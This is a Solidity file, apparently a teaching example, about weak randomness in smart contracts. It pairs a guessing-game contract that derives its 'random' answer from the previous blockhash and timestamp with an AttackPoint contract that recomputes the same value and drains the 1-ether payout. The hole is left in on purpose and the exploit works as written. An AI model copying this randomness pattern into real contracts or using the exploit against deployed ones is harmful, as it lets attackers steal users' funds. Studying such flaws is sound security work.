// SPDX-License-Identifier: UNLICENSED

/*This will show the most common form of generating a random number in a smart contract
Using the blockhash to generate a random number is simple, but comes with consequences
This code will explore these consequences using a simple gussing the random number contract
*/

pragma solidity ^0.8.7;

//creating the contract that will create the random number
contract WeakRandomness
{
    constructor() payable{} /*Creates a constructor that allows funds to be put into the contract */

    /*Function rng generates a random number using the previous blockhash*/
    function rng(uint _guess) public { 
        /*This creates a variable answer which reveices the previous bloackhash as the value to guess */
        uint answer = uint(keccak256(abi.encodePacked(
            blockhash(block.number - 1), /*This line calls on the previous (-1) blockhash */
            block.timestamp
        )));
        
        /*This if statment is used to check if the guess is correct */
        if (_guess == answer){
            (bool sent, ) = msg.sender.call{value: 1 ether}(""); /*This is a message that will send the transaction of 1 Ether*/
            require(sent, "Failed");
        }
    }

}

//creating the contract that will take the blockhash and exploit the WeakRandomness contract
contract AttackPoint
{
    receive() external payable{}

    function steal(WeakRandomness guessTheRandomNumber) public {
       uint answer = uint(keccak256(abi.encodePacked(
           blockhash(block.number - 1),
           block.timestamp
       )));

       guessTheRandomNumber.rng(answer);
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}
